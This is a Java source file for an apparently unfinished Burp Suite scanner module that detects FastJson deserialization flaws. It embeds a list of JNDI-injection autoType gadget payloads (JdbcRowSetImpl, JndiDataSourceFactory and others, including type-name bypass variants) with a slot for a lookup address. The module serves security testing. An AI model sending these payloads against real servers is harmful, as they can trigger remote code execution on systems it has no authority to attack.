package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IParameter;
import burp.scan.active.ModuleBase;
import burp.scan.active.ModuleMeta;
import burp.scan.active.feature.Debug;
import burp.scan.lib.HTTPParser;
import burp.scan.lib.utils.Logger;
import burp.scan.lib.web.WebPageInfo;
import org.apache.commons.lang3.tuple.MutablePair;
import org.apache.commons.lang3.tuple.Pair;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Set;

public class FastJsonDetection implements ModuleBase, Debug {
    static String[] PAYLOADS = {
            "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"%s\"}",
            "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"%s\"}",
            """
    {
        "a": {
            "@type": "java.lang.Class", 
            "val": "com.sun.rowset.JdbcRowSetImpl"
        }, 
        "b": {
            "@type": "com.sun.rowset.JdbcRowSetImpl", 
            "dataSourceName": "%s", 
            "autoCommit": true
        }
    }
    """,
            "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"%s\"}}",
            "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"%s\", \"autoCommit\":true}",
            "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"%s\", \"autoCommit\":true}",
            "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"%s\", \"autoCommit\":true}",

    } ;
    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        Logger logger = Logger.getLogger(Logger.Level.Debug);
        var parameters = webInfo.getReqInfo().getParameters();
        List<Pair<Integer,Integer>> testParameters = new ArrayList<>();
        for (var parameter : parameters) {
            try {
                String value = URLDecoder.decode(parameter.getValue(), StandardCharsets.UTF_8.name());
                new JSONObject(value);
                testParameters.add(new MutablePair<>(parameter.getValueStart(),parameter.getValueEnd()));
            } catch (JSONException | UnsupportedEncodingException ignored) {
            }
        }

        if (webInfo.getReqInfo().getMethod().equalsIgnoreCase("post")) {
            if (Objects.requireNonNull(HTTPParser.getRequestHeaderValue(webInfo.getReqInfo(), "Content-Type")).contains("json")) {
                testParameters.add(new MutablePair<>(webInfo.getReqInfo().getBodyOffset(),webInfo.getRequest().length));
            }
        }


    }

    @Override
    public Set<String> getTags() {
        return null;
    }

    @Override
    public ModuleMeta getMetadata() {
        return null;
    }
}
